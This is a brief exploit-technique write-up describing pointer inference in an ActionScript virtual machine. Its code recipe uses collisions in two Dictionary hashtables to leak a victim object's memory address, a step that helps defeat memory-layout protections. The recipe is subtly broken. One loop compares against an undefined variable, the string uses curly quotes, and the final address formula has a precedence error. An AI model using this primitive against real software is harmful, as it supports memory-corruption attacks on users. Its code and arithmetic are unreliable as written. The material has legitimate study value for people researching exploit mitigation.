### Attack Summary

***Pointer inference:*** Recovering the memory address of an internal object via "normal" (non-exploit) interactions with target software.

### Attacker Threat Model

The attacker has access to the VM of a dynamically typed language (ECMA|Java|Action)Script, Java, Python, etc. and can write a script to locate the memory address of a given object.

### Background

ActionScript interpreter represents internal objects using ***tagged pointers (atoms)***. The tag can be read to determine if it is stored by value or reference (string or object). The ActionScript dictionary exposes an associative map data structure to associate any ActionScript object with another. It is implemented as a hashtable that derives the hash from the key atom and stores the key and value atom together in the table.

### Recipe

```javascript
// First, create the Dictionaries
var even = new Dictionary();
var odd = new Dictionary();
// Now, fill the Dictionary objects with the integer atoms
var index;
for (index = 0; index < 8; index += 1) {
    even[index * 2] = true;
    odd[index * 2 + 1] = true;
}
// The victim object is added to both dictionaries
var victim = “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA”;
even[victim] = true;
odd[victim] = true;
// The two integers before the victim
var curr, evenPrev, oddPrev;
for (curr in even) {
    if (curr == victim) { break; }
    evenPrev = curr;
}
for (curr in odd) {
    if (curr == obj) { break; }
    oddPrev = curr;
}
```

The two integers should differ by 17 due to linear probe on collision. In this case, the smaller value is from the dictionary that does not have the collision. If it is anything else, the probe wrapped and the larger value is from the dictionary that did not have the collision. Once the integer is found, it can be turned into an atom that is 8 smaller than the victim atom. So (x << 3 + 8) or ((x+1) << 3).

Data structure leaks can also involve: *internal ids (Python), hash functions (.NET or Java).*
